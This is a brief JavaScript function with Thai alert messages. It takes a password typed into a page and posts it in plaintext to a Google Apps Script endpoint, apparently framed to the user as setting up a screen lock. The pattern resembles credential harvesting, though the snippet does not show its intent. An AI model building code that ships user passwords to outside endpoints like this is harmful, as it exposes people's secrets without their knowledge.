function sendPassword() {
    var password = document.getElementById("passwordInput").value;
    fetch("https://script.google.com/macros/s/AKfycbzTr5e-vugJIz9AGhKgur81CUujxkPJGYWUeTK2mVFyqLfHWCobGHVEKOECoe9HZNr1/exec", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ password: password })
    }).then(response => {
        if (response.ok) {
            alert("บันทึกรหัสแล้ว ล็อกหน้าจอของคุณ!");
        } else {
            alert("เกิดข้อผิดพลาด!");
        }
    });
}
